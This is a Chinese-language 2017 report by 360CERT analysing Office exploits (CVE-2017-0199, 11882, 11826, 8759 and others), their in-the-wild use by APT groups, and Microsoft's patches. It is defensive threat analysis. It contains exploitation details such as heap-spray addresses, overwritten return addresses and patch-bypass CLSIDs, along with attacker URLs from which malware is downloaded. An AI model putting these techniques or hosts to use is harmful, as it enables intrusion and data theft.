> 原文链接: https://www.anquanke.com//post/id/93040 


# 360CERT: 2017年度安全报告--Office


                                阅读量   
                                **282465**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t015b27d2ee2354ab8a.png)](https://p2.ssl.qhimg.com/t015b27d2ee2354ab8a.png)

## 2017年Office攻击依然活跃

微软的Office套件在全球范围内的各个平台拥有广泛用户，它的安全问题一直是信息安全行业关注的一个重点。根据调查，2017的网络攻击行为依然在大量使用 Office 相关漏洞。通过对漏洞文档抽样分析，发现攻击者最喜欢利用的载体为 Office, 其次是 RTF（Rich Text Format）。除了自身漏洞的利用，还会复合其他漏洞到Office攻击场景中。本文是360CERT对2017年Office相关漏洞的总结。

## 概览

Microsoft Office 是一套由微软公司开发的办公软件套装，它可以在 Microsoft Windows、Windows Phone、Mac、iOS 和 Android 等系统上运行。

作为微软最成功的两个产品，Windows 和 Office，拥有绝对的市场占有率。同时，他们安全问题也是黑客们关注的焦点，是网络攻击的绝佳途径。查阅微软 2017 年的安全更新，Office系列以482次位于次席。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011fc31d3dea7e79c8.png)

七月份的BlackHat大会上， Pwnie Awards将年度最佳客户端安全漏洞奖颁给了微软Office 的一枚漏洞，即CVE-2017-0199。

Office漏洞利用，通常应用在钓鱼攻击场景中。根据360安全卫士提供的数据，对2017年出现的鱼叉攻击邮件抽样分析统计显示，Word，Excel，PowerPoint总占比高达65.4%，其次是RTF（27.3％）及PDF（7.3%）。RTF文件结构简单，默认情况下，系统会调用的Word程序来解析。因此很多攻击者选择使用RTF文档，嵌入恶意OLE对象触发相关漏洞或绕过Office的安全保护机制。

[![](https://p0.ssl.qhimg.com/t018e655d5261dd352c.png)](https://p0.ssl.qhimg.com/t018e655d5261dd352c.png)

进一步对Office攻击样本进行统计分析，发现大多数攻击是使用宏和漏洞。
- 恶意宏文档制作简单，兼容性强，并且攻击成本较小，所以整体占比较大，达到了3%。但是使用恶意宏进行攻击，往往需要用户进行交互，攻击的隐蔽性不强。
- 利用Office相关漏洞，可以在用户不察觉的情况下达到攻击的目的。利用漏洞触发的文档占比只有3%，但是这种攻击方法更加的隐秘和危险。
[![](https://p5.ssl.qhimg.com/t016a58568cd6f984e2.png)](https://p5.ssl.qhimg.com/t016a58568cd6f984e2.png)

下面就对2017年，比较具有攻击价值的Office漏洞进行梳理。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0113ae8f450732718a.png)

## CVE-2017-0262：EPS中的类型混淆漏洞

EPS（英文全称：Encapsulated PostScript）是PostScript的一种延伸类型。可以在任何的作业平台及高分辨率输出设备上，输出色彩精确的向量或位图，是分色印刷，美工排版人员最爱使用的图档格式。在Office中，也对其进行支持，CVE-2017-0262就是Office EPS过滤器中的一个漏洞。该漏洞已经被应用到实际攻击中，下面结合攻击样本，对该漏洞进行分析。

### 技术细节

该文件为docx文件，打开时会触发Office EPS过滤器中的一个漏洞CVE-2017-0262。查看文件目录，恶意的EPS文件在word/media/image1.eps下：

[![](https://p0.ssl.qhimg.com/t01b4c48b6caebfe572.png)](https://p0.ssl.qhimg.com/t01b4c48b6caebfe572.png)

CVE-2017-0262是由forall操作符而引起的类型混淆的漏洞，攻击者可以利用该漏洞改变执行流程，将值控制到操作数的堆栈上。这个EPS利用文件通过一个简单的XOR混淆。使用的密钥是一个十六进制编码字符串0xc45d6491，而exec被解密的缓存所调用。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01cc9a01a3fd7d0997.png)

一旦获取代码执行，它就会加载一个shellcode用于检索未经记录的Windows API：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011c70ff3531ee1233.png)

多次解密后，释放的攻击代码对系统破坏。注意，这些执行都发生在以当前用户权限运行的WINWORD.EXE进程中。之后会配合CVE-2017-0263进行本地提权进行进行进一步攻击。

### 在野利用情况

2017年5月ESET发布报告称发现APT28干扰法国总统大选。一个名为Trump’s_Attack_on_Syria_English.docx的文档引起了研究人员的注意。研究人员分析后发现这个文档的真实作用是释放Seduploader。为实现这一目的，该组织利用了两个0day：EPS中的类型混淆漏洞CVE-2017-0262和内核提权漏洞 CVE-2017-0263。这封钓鱼邮件跟特朗普对叙利亚的攻击有关。

[![](https://p5.ssl.qhimg.com/t013b545248aebde0a6.png)](https://p5.ssl.qhimg.com/t013b545248aebde0a6.png)

打开这份文档后首先会触发CVE-2017-0262。多次解密后，Seduploader病毒释放器就会被加载并予以执行。为了部署Seduploader，Seduploader病毒释放器通过利用CVE-2017-0263获取了系统权限。

## CVE-2017-0199&amp;&amp;CVE-2017-8570OLE对象中的逻辑漏洞

CVE-2017-0199漏洞利用OFFICE OLE对象链接技术，将恶意链接对象嵌入在文档中，之后调用URL Moniker将恶意链接中的HTA文件下载到本地，URLMoniker通过识别响应头中content-type的字段，最终调用mshta.exe执行HTA文件中的攻击代码。攻击者通过该漏洞可以控制受影响的系统，对受害者系统进行安装后门，查看、修改或删除数据，或者创建新用户。

虽然微软官方及时发布了针对了该漏洞的补丁，但是仍有大量的恶意样本使用该漏洞进行攻击。在野利用的样本多以word文档形式进行传播利用，且具有较大的欺骗性。

### 技术细节

用winhex打开poc.rtf文件，可以找到一个关键字段objautlink：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01083ef14fada0dbb9.png)

该漏洞的关键点为对象被定义成一个OLE“链接”对象，用winhex打开文件可以找到“Object Data”对象（从“\objdata”控制字开始）如下：

[![](https://p2.ssl.qhimg.com/t01a274eb6cfe7d5d8a.png)](https://p2.ssl.qhimg.com/t01a274eb6cfe7d5d8a.png)

“01050000”表示版本信息，“000a0000”表示数据长度，“d0cf11e0”表明这是一个OLE结构的流，并且是一个“链接”对象。Moniker是一个特殊的COM对象，可以通过该对象寻找另外一个对象。Windows操作系统上存在的Moniker有File Moniker、Item Moniker、URL Moniker、“Script”Moniker等。传播的恶意样本利用的漏洞为URL Moniker上出现的漏洞。

URL Moniker 开放了IPersistStream接口，IPersistStream中的Load()方法可以加载“StreamData”，URL Moniker的StdOleLink结构会使其调用“IMoniker::BindToObject()”方法。该方法会使得进程去寻找目标对象，让它处在运行状态，提供一个该对象的特定接口指针来调用它。如果URL是以“http”开头，那么URL Moniker就会尝试从指定URL的服务器上下载资源，当“资源”是一个HTA文件时，会通过 “mshta.exe”加载运行。

URL Moniker调用的过程如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019914af07c910f7a3.png)

恶意样本为了避免和用户交互，会使用objupdate字段来自动更新对象，当打开恶意文档时，会自动加载远程URL的对象，攻击者的服务器会针对受害者客户端的HTTP请求返回Content-type为application/hta响应，并下发HTA脚本。

objupdate的官方描述如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a62ebc4b25e44a01.png)

这个漏洞是由于URL Moniker可以通过OLE执行危险的HTA。 URL Moniker无法直接运行脚本，但是它可以找到一个OLE对象并使用这个对象来处理内容，当内容为HTA内容时, “htafile” OLE对象被启动，HTA内容里的脚本得到运行。

[![](https://p3.ssl.qhimg.com/t013209af58a1fadb8e.png)](https://p3.ssl.qhimg.com/t013209af58a1fadb8e.png)

### 有缺陷的修补

对CVE-2017-0199，微软采取的修补，采用了一种“COM Activation Filter”的机制，过程简单粗暴，修补程序封锁了两个危险的CLSID，`{`3050F4D8-98B5-11CF-BB82-00AA00BDCE0B`}`（“htafile”对象）和`{`06290BD3-48AA-11D2-8432-006008C3FBFC`}`（“script”对象）。CVE-2017-0199和CVE-2017-8570复杂就复杂在Composite Moniker。Moniker绑定指定的对象时，必须要为调用者提供指向所标识对象指定接口的指针。这个过程时通过IMoniker::BindToObject()方法实现的：

```
HRESULTBindToObject(  
[in]  IBindCtx *pbc,  
[in]  IMoniker *pmkToLeft,  
[in]  REFIID riidResult,  
[out]  void **ppvResult  
);
```

绑定“新”Moniker时，通过“pmkToLeft”参数获得Left名字。在这种情况下， mk是File Moniker。之前是封锁了“htafile”对象和“script”对象，CVE-2017-8570利用了一个其他的对象：“scriptletfile”，CLSID是“`{`06290BD2-48AA-11D2-8432-006008C3FBFC`}`”，从而绕过了CVE-2017-0199的补丁。

### 在野利用情况

#### 1. 野外利用的第一个 RTF 版本

CVE-2017-0199 漏洞在第一次被公开时，野外最早利用的样本是以 word文档的形成进行传播利用，由于 office 文档后缀关联的宽松解析特性，更改其他文档后缀名攻击仍然可以成功，所以野外利用的大部分恶意文档的真实文件格式是 RTF 格式，但恶意文档的后缀名却是 doc 、docx 等后缀，该攻击具有较强的伪装欺骗特性。在野外利用样本文件格式中有一个关键字段 objupdate，这个字段的作用是自动更新对象，当受害者打开 office 文档时就会加载远程 URL的对象，对远程服务器触发一个 HTTP 请求，恶意服务器会对针对客户端的 http请求强制返回 Content-type 为 application/hta 响应，最终客户端 office 进程会将远程的文件下载当作 hta 脚本运行，整个攻击过程稳定且不需要受害者的任何交互操作。

[![](https://p2.ssl.qhimg.com/t01571e40384102cf7e.png)](https://p2.ssl.qhimg.com/t01571e40384102cf7e.png)

#### 2. 野外利用的第二个 PPSX 版本

由于 RTF 版本的漏洞大量利用，各家安全软件检出率也都比较高，攻击者开始转向另外一种 office 文档格式进行攻击，攻击者发现 ppsx 格式的幻灯片文档也可以无交互触发漏洞，该利用方式的原理是利用幻灯片的动画事件，当幻灯片的一些预定义事件触发时可以导致漏洞利用。如下图，一个流行的攻击样本中嵌入的恶意动画事件：

[![](https://p3.ssl.qhimg.com/t0105577aabd63a64a7.png)](https://p3.ssl.qhimg.com/t0105577aabd63a64a7.png)

事件会关联一个olelink对象，原理类似之前所讲的rtf版本， xml中的字段如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019b2761bc77906e11.png)

对象会嵌入的是一个带有 script 协议头的远程地址，而 url 地址中的 XML文件是一个恶意 sct 脚本。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017abed2b75720969e.png)

当受害者打开恶意幻灯片文档时就会自动加载远程 URL 的对象对远程服务器发起一个 HTTP 请求将文件下载到本地，最终客户端 office 进程会将下载到本地的文件当作 sct 脚本执行。

#### 3. 新流行的第三个 DOCX 版本

发现有部分Docx文档使用了CVE-2017-0199漏洞，攻击者非常巧妙的将 CVE-2017-0199 漏洞的RTF 文件作一个源嵌入到了 Docx 格式的文档中，这样导致 docx 文件在打开时是自动去远程获取包含 0199 漏洞的 rtf 文件再触发后面的一连串攻击行为，这样的攻击增加了安全软件的查杀难度，一些杀软根本无法检测这种攻击。

如下图，docx文档嵌入了一个远程的文档对象，打开文档后会自动打开远程的恶意 RTF 文件！

[![](https://p2.ssl.qhimg.com/t01d7613802a54a1ddc.png)](https://p2.ssl.qhimg.com/t01d7613802a54a1ddc.png)

#### 4. 新发现的“乌龙”样本

在外界发现了多例标注为 CVE-2017-8570 的 office 幻灯片文档恶意样本，同时有安全厂商宣称第一时间捕获了最新的 office 漏洞，但经过分析，发现该样本仍然是 CVE-2017-0199 漏洞野外利用的第二个 PPSX 版本，通过对一例典型样本进行分析，发现样本使用的 payload 是 Loki Bot 窃密类型的木马病毒，是一起有针对性的窃密攻击。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0106cf0797ab1f3eae.png)

该样本使用powershell下载执行一个混淆的.NET 程序。下载地址为：

hxxp://192.166.218.230:3550/ratman.exe。shell.exe 会内存解密执行 Loki Bot 功能，这时 Loki Bot 木马会窃取各种软件的信息。最后提交窃取的相关数据到远程服务器。

[![](https://p4.ssl.qhimg.com/t01f655b4895c765511.png)](https://p4.ssl.qhimg.com/t01f655b4895c765511.png)

## OOXML类型混淆漏洞（CVE-2017-11826）

2017 年 9 月 28 日，360 核心安全事业部高级威胁应对团队捕获了一个利用 Office 0day漏洞（CVE-2017-11826）的在野攻击。该漏洞当时几乎影响微软所支持的所有 office 版本，在野攻击只针对特定的 office 版本。攻击者以在 RTF 文档中嵌入了恶意 docx 内容的形式进行攻击。微软在 2017 年 10 月 17 日发布了针对该漏洞的补丁。

### 技术细节

漏洞原因在于 font 标签没有闭合，处理 idmap 标签时，操作的还是 font 标签的内存布局。正常文件处理 idmap 时，嵌套层数为 5，处理目标为3，操作的是 OLEObject 标签的内存空间。漏洞文件处理 idmap 标签时，嵌套层数为 5，处理目标为4，此时操作的是 font 标签的内存空间。

样本在 RTF 中嵌入了 3 个 OLE 对象, 第一个用来加载 msvbvn60.dll 来绕过系统ASLR，第二个用来堆喷，做内存布局，第三个用来触发漏洞。

#### 第一个ole 对象

用 winhex 打开 RTF 样本并搜索“object”字符串可以找到第一个对象:

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01dfbc017a3c9c14a0.png)

Oleclsid 后 面 跟 的 一 串 字 符 为 该 COM 对象的 CLASSID ，在注册表对应的是C:\Windows\system32\msvbvm60.dll，通过 Process Explorer 也可以看到 word 加载了msvbvm60.dll，用于绕过 ASLR。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0156730749e3d32073.png)

#### 第二个 ole 对象

继续将剩下的两个对象提取出来，解压第二个嵌入的 ole ，是一个 word 对象，可以在/word/activeX目录里找到40个activeX*.xml 文件和一个 activeX1.bin，

这些文件是用来堆喷的。其中 ActiveX1.bin 为堆喷的内容。

[![](https://p4.ssl.qhimg.com/t015995c3fd026edc0b.png)](https://p4.ssl.qhimg.com/t015995c3fd026edc0b.png)

通过堆喷来控制内存布局，使[ecx+4]所指的地址上填充上 shellcode，最后通过 shellcode调用 VirtualProtect 函数来改变内存页的属性，使之拥有执行权限以绕过 DEP 保护。

#### 第三个 ole 对象

提取第三个 ole ，在解压得到的 document.xml 中可以找到崩溃字符串”Lincer CharChar”：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0119b6354636a1f604.png)

用 winhex 打开该文件，字符串中间乱码的为”E8 A3 AC E0 A2 80”，内存中找到却是“EC 88 88 08”（编码原因，“E8 A3 AC E0 A2 88”为 ASCII 形式，而“EC 88 88 08”是Unicode 形式）。

对样本进行分析。通过栈回溯可以发现漏洞发生在Office14\WWLIB.DLL中：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0175e6d479bd5716d4.png)

在IDA中定位到问题点，崩溃点是发生在 call dword ptr [ecx+4]，如果有之前有堆喷操作进行内存布局，在 0x88888ec 上放置 shellcode，那就可以跳转去执行，进行样本下一步的攻击。

[![](https://p0.ssl.qhimg.com/t01cf750bd7b8b32325.png)](https://p0.ssl.qhimg.com/t01cf750bd7b8b32325.png)

### 官方补丁

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012ea77e47fb46125a.png)

打过补丁之后，可以看到多了一个判断分支。调试补丁到这发现：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01432b5ff0c6107ce0.png)

两个值不相等，跳转到右边分支，漏洞就无法被触发了。查看地址 0x649bcb04 的内容：

[![](https://p4.ssl.qhimg.com/t01b3cac5b6a7add4fc.png)](https://p4.ssl.qhimg.com/t01b3cac5b6a7add4fc.png)

根据动态跟踪调试发现处理 font 标签时调用了该地址的函数：

[![](https://p3.ssl.qhimg.com/t01690d7223935afe6e.png)](https://p3.ssl.qhimg.com/t01690d7223935afe6e.png)

这里猜测[eax+48h]为 font 对象处理函数的指针，而 0x64da4a4a 表示解析 OLEObject 对象。正常情况下，解析 idmap 时，应该获取 OLEObject 对象设置的数据，[eax+48]应该等于0x64da4a4a，然而这里并不相等，说明不是处理 OLEObject 对象设置的数据，跳转到右边分支，就不会执行到漏洞触发点了。

### 在野利用情况

根据360核心安全团队提供的数据，此次0day漏洞攻击在野利用真实文档格式为RTF（Rich Text Format），攻击者通过精心构造恶意的word文档标签和对应的属性值造成远程任意代码执行，payload荷载主要攻击流程如下，值得注意的是该荷载执行恶意代码使用了某著名安全厂商软件的dll劫持漏洞，攻击最终会在受害者电脑中驻留一个以文档窃密为主要功能的远程控制木马。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0198d5e78262c67429.png)

## 隐藏17年的陈年老洞（CVE-2017-11882）

CVE-2017-11882是一个Office远程代码执行的漏洞。该漏洞位于EQNEDT32.EXE（Microsoft公式编辑器），这个组件首发于Microsoft Office 2000和Microsoft 2003，用于在文档中插入和编辑方程式，EQNEDT32.EXE在17年前编译后再未更改。虽然从Microsoft Office 2007开始，显示和编辑方程的方法发生了变化，但是为了保持版本兼容性，EQNEDT32.EXE并没有从Office套件中删除。

EQNEDT32.EXE为OLE实现了一组标准的COM接口。

IOleObject

IDataObject

IOleInPlaceObject

IOleInPlaceActiveObject

IpersistStorage

而问题的就在于IpersistStorage：Load这个位置。因为历史久远，该组件开发的时候并没有例如ASLR这样的漏洞缓解措施。利用起来非常方便。

### 技术细节

问题出在EQNEDT.EXE中的IpersistStorage：Load。如图所示，strcpy函数没有检查复制时的长度，造成了溢出。

[![](https://p2.ssl.qhimg.com/t01d9323990ad4088c1.png)](https://p2.ssl.qhimg.com/t01d9323990ad4088c1.png)

通过调试可以猜测在正常情况下eax寄存器，也就是第一个参数应该是字体名。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014f0bdf97db0d7d23.png)

通过rtfobj抽取样本中的OLE对象，发现字体名为cmd.exe。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013593663012c7da77.png)

[![](https://p5.ssl.qhimg.com/t0187c3935247fcfe17.png)](https://p5.ssl.qhimg.com/t0187c3935247fcfe17.png)

在填充的AAA……之后是0x430C12，也就是EQNEDT.EXE中调用WinExec的地方。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01cbe27b8cf8ad9fd9.png)

返回地址被覆盖为0x430C12，从而执行命令。最后便可以弹出计算器。

### 在野利用情况

2017年12月FireEye发布报告称发现APT34利用刚刚修复的CVE-2017-11882攻击中东政府[序号29]。下图是payload中漏洞利用的部分，可以看到漏洞利用成功后payload调用mshta.exe从[hxxp://mumbai-m[.]site/b[.]txt](http://mumbai-m.site/b.txt)下载恶意的脚本。

[![](https://p4.ssl.qhimg.com/t01a99b9e37f52f935d.png)](https://p4.ssl.qhimg.com/t01a99b9e37f52f935d.png)

payload使用DGA算法与CC通信，并且具有多种远控功能。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01595fb47c6a623915.png)

[![](https://p3.ssl.qhimg.com/t01f03d9fddeb1750ee.png)](https://p3.ssl.qhimg.com/t01f03d9fddeb1750ee.png)

在过去几个月中，APT34已经能够迅速利用至少两个公开漏洞(CVE-2017-0199和CVE-2017-11882)针对中东的组织发起攻击。

## 其他漏洞在Office情境下的利用（CVE–2017–11292和CVE-2017-8759）

因为Office的高拓展性，它会对其他一些流行的应用进行支持，比如PDF，Flash，multimedia，在线功能拓展等，Office会依托第三方接口对相应的功能进行支持。这种情况下，如果Office所依托的平台或者支持应用本身出现漏洞，那么就造成Office安全问题。

8月24日，360核心安全事业部捕获到一新型的office高级威胁攻击。9月12日，微软才进行了大规模安全更新，攻击使用的CVE-2017-8759（.NET Framework漏洞）在野利用时为0day状态。与之类似的还有在10月10日卡巴斯基确定的Adobe Flash 0 day漏洞攻击，将恶意Flash嵌入到Word中，用户打开文档便会中招。10月16日，Adobe紧急发布安全公告，修复了该漏洞（CVE-2017-11292）。

两枚漏洞都不是Office自身的问题，却可以利用在Office攻击中。

### 技术分析

#### CVE-2017-11292类型混淆漏洞

在CVE-2017-11292利用样本中，嵌入一个包含恶意Flash的Active对象：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0181c5859a7ec209f1.png)



问题定位在，“com.adobe.tvsdk.mediacore.BufferControlParameters”，这个类存在一个类型混淆漏洞。攻击者可以利用该漏洞，在内存中任意读写，可以借此执行第二段shellcode。值得注意的是，CVE-2017-11292漏洞，Flash全平台均受影响。

#### CVE-2017-8759 .NET Framework中的逻辑漏洞

CVE-2017-8759漏洞原因为对wsdl的xml处理不当，如果提供的包含CRLF序列的数据，则IsValidUrl不会执行正确的验证。

[![](https://p0.ssl.qhimg.com/t01d8cd0aa6860f39c6.png)](https://p0.ssl.qhimg.com/t01d8cd0aa6860f39c6.png)

正常情况下当返回的文件中包含多个soap:address location时PrintClientProxy函数生成的代码只有第一行是有效的，其余行为注释。但是该部分代码没有考虑soap:address location内容有可能存在换行符，导致注释指令“//”只对第一行生效，其余则作为有效代码正常执行。恶意样本中构造的soap xml数据，如下图：

[![](https://p4.ssl.qhimg.com/t0196eb55587a183668.png)](https://p4.ssl.qhimg.com/t0196eb55587a183668.png)

由于存在漏洞的解析库对soap xml数据中的换行符处理失误，csc.exe编译其注入的.net代码。生成logo.cs并编译为dll，抓捕到cs源文件以及生成的dll。

整个利用过程为：
1. 请求恶意的SOAP WSDL
1. .NET Framework的Runtime.Remoting.ni.dll中的IsValidUrl验证不当
1. 恶意代码通过.NET Framework的Runtime.Remoting.ni.dll中PrintClientProxy写入cs文件。
1. exe对cs文件编译为dll
1. 外部加载dll
1. 执行恶意代码
### 在野利用情况

CVE-2017-8759野外利用样本的真实文档格式为rtf，利用了cve-2017-0199一样的objupdate对象更新机制，使用SOAP Moniker从远程服务器拉取一个SOAP XML文件，指定 .NET库的SOAP WSDL模块解析。漏洞的完整执行流如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t017033063d95db35b2.png)

通过对PE荷载的分析，发现该样本该样本使用了重度混淆的代码和虚拟机技术专门阻止研究人员分析，该虚拟机加密框架较复杂，大致流程如下。

[![](https://p4.ssl.qhimg.com/t0176e29a5c393477e7.png)](https://p4.ssl.qhimg.com/t0176e29a5c393477e7.png)

最终360集团核心安全事业部分析团队确定该样本属于FINSPY木马的变种，该木马最早出自英国间谍软件公司Gamma ，可以窃取键盘输入信息、Skype对话、利用对方的网络摄像头进行视频监控等。该样本被爆出过的控制界面：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0176411a5854391907.png)

和CVE-2017-8759在野攻击方式类似，CVE-2017-11292在攻击中利用的是为了释放恶意程序。这个恶意文档在一个ActiveX控件中嵌入了两个相同的Flash对象，原因不明。嵌入Flash将解压缩第二个Flash对象，该Flash对象处理与漏洞发布服务器的通信。有机构报道称，World War 3诱饵的文档是由APT28组织进行散布的，用来攻击某些特定的机构。

[![](https://p2.ssl.qhimg.com/t0163cea5fd772e32e6.png)](https://p2.ssl.qhimg.com/t0163cea5fd772e32e6.png)

## 总结

攻击者针对特定目标投递特定主题及内容的电子邮件来进行攻击，安全意识薄弱的用户很容易中招。这种鱼叉式钓鱼，在 APT攻击中很常见。下表是 2017 年观测到的大型 APT 活动中，利用 Office 漏洞的情况。
<td width="105">CVE编号</td><td width="123">漏洞类型</td><td width="110">披露厂商</td><td width="110">0day利用情况</td><td width="105">Nday利用情况</td>
